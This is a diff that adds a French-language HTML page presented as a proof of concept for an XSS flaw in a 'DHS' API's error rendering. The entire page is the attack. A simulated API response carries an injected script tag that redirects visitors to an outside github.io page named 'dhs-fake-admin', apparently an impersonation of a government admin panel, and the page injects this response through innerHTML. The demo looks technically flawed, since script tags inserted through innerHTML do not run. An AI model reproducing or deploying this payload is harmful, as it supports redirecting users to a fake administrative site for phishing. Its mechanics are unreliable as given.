@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>DHS - PoC: Vulnérabilité XSS dans le rendu d'API</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f6f9; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { text-align: center; padding: 40px; background-color: white; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        h1 { color: #d32f2f; }
+        p { font-size: 1.2em; }
+        #error-box { display: none; } /* Caché, car le script va s'exécuter immédiatement */
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Démonstration d'Exploitation XSS</h1>
+        <p>Cette page simule le rendu d'une réponse d'API vulnérable...</p>
+        <p><strong>Redirection en cours...</strong></p>
+
+        <div id="error-box"></div>
+
+        <script>
+            // 1. On simule la réponse JSON brute de l'API DHS qui contient votre payload.
+            const reponseApiMalveillante = "Value of filter ''><script>window.location.replace('https://6r1n6o13-code.github.io/dhs-fake-admin/')</script>' does not match pattern";
+
+            // 2. On simule une erreur de développement : injecter cette réponse directement dans le HTML de la page.
+            // C'est le point clé qui déclenche le XSS.
+            document.getElementById("error-box").innerHTML = reponseApiMalveillante;
+        </script>
+    </div>
+</body>
+</html>
